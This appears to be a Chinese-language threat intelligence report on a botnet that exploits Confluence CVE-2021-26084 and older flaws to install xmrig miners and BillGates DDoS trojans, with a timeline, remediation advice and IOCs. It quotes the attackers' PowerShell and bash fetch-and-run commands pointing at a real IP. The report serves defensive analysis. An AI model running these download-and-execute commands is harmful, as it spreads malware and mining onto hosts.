# 概述

近日，阿里云安全监测到利用Atlassian Confluence 远程代码执行漏洞传播的僵尸网络随PoC公布后攻击与入侵量大幅上升，该僵尸网络由N
Day利用某微E-cology WorkflowServiceXml远程代码执行、Yapi Mock远程命令执行漏洞、Hadoop
Yarn未授权访问漏洞等方式攻击，快速集成Atlassian Confluence 远程代码执行漏洞0
Day并在互联网传播，从而实现快速部署挖矿、DDoS后门远控等功能，对主机、用户资产危害极大。

阿里云安全持续对该僵尸网络进行监控，发现近期传播有所上升，提醒广大用户注意防护。

![image](https://image.3001.net/images/20210915/1631691039_6141a11f21b7b9867a967.jpg!small)

# 传播手段

僵尸网络通过多种方式进行入侵，快速集成Atlassian Confluence
远程代码执行漏洞利用PoC进行传播，最终在主机上下载挖矿、DDoS木马，如图是传播路径。

![image](https://image.3001.net/images/20210915/1631691403_6141a28b927c363b912cc.jpg!small)

### Att&CK阶段分析

![image](https://image.3001.net/images/20210915/1631691457_6141a2c1b168948c112d4.jpg!small)

# 详细分析

针对该僵尸网络，已经通过E-cology WorkflowServiceXml远程代码执行、Yapi Mock远程命令执行漏洞、Hadoop
Yarn未授权访问漏洞、锐捷网关远程命令执行漏洞等众多历史漏洞对云上资产进行入侵，而Atlassian Confluence
远程代码执行漏洞出现后，该团伙进行了迅速的集成并传播。云上最早于2021年9月2日发现了该僵尸网络的扫描与入侵行为，距离互联网的PoC曝光仅过去一天的时间。如图，僵尸网络入侵Windows主机后通过Powershell脚本下载xmrig挖矿木马进行挖矿，入侵Linux主机后通过Bash脚本下载Billgates
DDoS木马并运行。

    
    
    powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://213.202.230.103/xmrig.exe','xmrig.exe')
    xmrig.exe -o pool.supportxmr.com:5555 -u 47bWqjkXUKtK3ifA8jV4of3i766TUCBSvazFokWsQmujEMmQ1LVXnuoSg3TwdepXziCwZGxvcMQp8cyNtxo4dG43RCmM2Fi -p xwei
    
    
    
    bash -c cd /tmp;curl -O http://213.202.230.103/syn;wget http://213.202.230.103/syn;chmod 777 syn;./syn
    

该僵尸网络入侵主机后不仅进行挖矿行为，同时传播DDoS木马，使主机变为肉鸡。如图僵尸网络的下载源中包含了几款不同的DDoS客户端。

![image](https://image.3001.net/images/20210915/1631691547_6141a31b6f74e9d440a1b.jpg!small)

针对这些文件简要分析如下。

### bie.exe/ma.exe分析

bie.exe(md5: 343492b2184371ae20bdb855126faac5)、ma.exe(md5:
4b1246d6bff5180642623a414c63efeb)皆为Windows版Billgates，如图包含了CC攻击、TCP Flood、UDP
Flood、ICMP Flood等。

![image](https://image.3001.net/images/20210915/1631691610_6141a35a23e2248d675d5.jpg!small)

### qu/quu分析

qu(md5: bb17226b0568eeab3929914a532c351e)是基于ARM平台的DDoS木马，quu(md5:
8e764618b928d0e348d96dc2640e2d6b)是基于x86平台的DDoS木马，如图逆向分析发现二进制中包含了TCP_Flood、UDP_Flood、CC_Flood、SYN_Flood、DNS_Flood等众多功能。

![image](https://image.3001.net/images/20210915/1631691654_6141a38667d9931e18a84.jpg!small)

近一步分析该DDoS属于某DDoS系统的客户端，其组成部分共分为三个部分，服务器端为某DDoS.exe的平台，客户端通过DDoS生成器进行生成不同平台的可执行程序，dat中包含可修改的多架构的客户端。

![image](https://image.3001.net/images/20210915/1631691694_6141a3ae120cca2aa5874.jpg!small)

如图通过填写域名/IP可以生成不同平台下的客户端，包含了Linux2.4和2.6版本，也包含了其IOT平台下的arm、mips、dd-wrt等版本，通过不同版本的生成可以入侵到不同系统中达到控制多平台的功能。

![image](https://image.3001.net/images/20210915/1631691728_6141a3d0c559a95ea39ab.jpg!small)

通过如图的服务器端，可以控制客户端(失陷主机)对目标发动SYN_Flood、UDP_Flood、TCP_Flood、CC_Flood等多种类型的攻击。

![image](https://image.3001.net/images/20210915/1631691767_6141a3f70fd7073880cd4.jpg!small)

### bie/syn/syna/synsi分析

bie(md5: 1983401b0c7c291247785d56c377baa6)、syn(md5:
f1c238bbbaf447497a77cf951aab6c54)、syna(md5:
52ee1db0410a334aaacb401316f45046)、synsi(md5:
7e63f96ecd4a0c26c2100f4bca945781)都是BillGates DDoS木马。

![image](https://image.3001.net/images/20210915/1631691808_6141a420ad8f4f28780d4.jpg!small)

### 25000.zip分析

通过云上情报关联213.202.230.103目录下还挂载着25000.zip的文件，经解压为也为DDoS集群，其功能和用法同上述“qu/quu分析”介绍的一致，同时拥有生成器、服务器端、客户端，可以批量分发传播客户端，通过服务器端对集群进行管理，统一下发对目标发起的DDoS攻击。

![image](https://image.3001.net/images/20210915/1631691862_6141a456d7348763eacce.jpg!small)

# 虚拟补丁解密

当软件或应用程序出现漏洞后，官方通常通过补丁方式来进行升级和防止利用。补丁又分为热补丁和冷补丁，热补丁通常不需要复位、重启应用程序，而冷补丁需要复位或重启应用程序。为了业务能持续性的运行，企业应急时通常选择热补丁进行线上修复，待业务低峰期时再进行冷补丁修复。但无论冷、热补丁都需要直接对线上业务进行操作，如果操作不当可能引起不必要的业务中断或应用程序崩溃，而且线上业务往往较复杂，多个组件互相依赖，牵一发可能动全身。另一方面众多僵尸网络快速集成0day的工程化能力越来越强，企业安全人员在这个时候处在两难境遇。

云防火墙通过监测僵尸网络动态、互联网PoC披露等众多因素，能在小时级上线虚拟补丁进行拦截防御入侵行为，在网络侧保障业务稳定运行，为企业用户在主机层通过冷热补丁修复漏洞争取宝贵时间。例如针对Atlassian
Confluence远程代码执行漏洞，官方提供升级、缓解两种解决方案，但都需复位、重启应用程序，其后果可能会影响线上业务持续稳定运行，而如果通过虚拟补丁方式则可防御该漏洞被利用，同时不需要对当下环境做任何修改和变更。以下是该漏洞虚拟补丁的响应时间线:

![image](https://image.3001.net/images/20210915/1631691908_6141a484799c0e6aac428.jpg!small)

> 2021年08月26日，Atlassian官方发布了Atlassian Confluence
> 远程代码执行漏洞通告，漏洞编号为CVE-2021-26084，漏洞等级：严重。
>
> 2021年8月30日18时，阿里云云防火墙捕获Atlassian Confluence
> 远程代码执行漏洞在野利用，攻击来源IP：1.53.11.xxx，IP归属地越南。
>
> 2021年9月1日上午，Github公布其利用PoC。
>
> 2021年9月1日10时，阿里云云防火墙更新Atlassian Confluence 远程代码执行漏洞虚拟补丁。
>
> 2021年9月2日，发现该团伙利用Confluence远程代码执行漏洞进行入侵、传播挖矿、DDoS木马。

# 安全解决方案

1、依据官方通告中影响版本信息，排查企业是否使用该版本并升级到安全版本，官方链接为:
https://www.atlassian.com/software/confluence/download-archives。如果无法立即升级Confluence，可以参考官方给出的Mitigation对不同平台下的Confluence进行处理。

2、云防火墙提供虚拟补丁功能能有效的缓解、拦截针对Confluence远程代码执行漏洞的攻击、入侵行为。

![image](https://image.3001.net/images/20210915/1631691995_6141a4db59693d1202664.jpg!small)

3、针对已被入侵的企业客户，云防火墙失陷感知模块能够有效发现失陷主机对外连接行为，并提供事件相关处理建议。

![image](https://image.3001.net/images/20210915/1631692025_6141a4f9ba5af4c5f081c.jpg!small)

# IOC

> URL  
> http://213.202.230.103/syn  
> http://213.202.230.103/syna  
> http://213.202.230.103/synsi  
> http://213.202.230.103/xmm  
> http://213.202.230.103/mm.exe  
> http://213.202.230.103/qunima.exe  
> http://213.202.230.103/cao  
> http://213.202.230.103/gan  
> http://213.202.230.103/qusi  
> http://213.202.230.103/rinima  
> http://213.202.230.103/xmrig.exe  
> http://213.202.230.103/xmrig  
> http://213.202.230.103/s.cmd  
> http://213.202.230.103/ma.exe  
> http://213.202.230.103/Linux2.6  
> http://213.202.230.103/quu  
> http://213.202.230.103/bie  
> http://213.202.230.103/udp  
> http://213.202.230.103/25000.zip  
> IP  
> 213.202.230.103  
> MD5  
> bie: 1983401b0c7c291247785d56c377baa6 (ELF 32-bit)  
> bie.exe: 343492b2184371ae20bdb855126faac5 (PE32)  
> ma.exe: 4b1246d6bff5180642623a414c63efeb (PE32)  
> qu: bb17226b0568eeab3929914a532c351e (ELF 32-bit ARM)  
> quu: 8e764618b928d0e348d96dc2640e2d6b (ELF 32-bit Intel)  
> s.cmd: 5d2ceff006864e3e7a41aae345599290 (powershell)  
> syn: f1c238bbbaf447497a77cf951aab6c54 (ELF 32-bit)  
> syna: 52ee1db0410a334aaacb401316f45046 (ELF 32-bit)  
> synsi: 7e63f96ecd4a0c26c2100f4bca945781 (ELF 64-bit)  
> xmm: 7e6b1473161ca0267f05870d55a10d77 (xmrig ELF 64-bit)  
> xmrig.exe: 889d91ab9ef2ad48ad90a7fa87d3fc81 (xmrig PE32+)  
> C&C  
> 204.44.93.54  
> 300gsyn.it

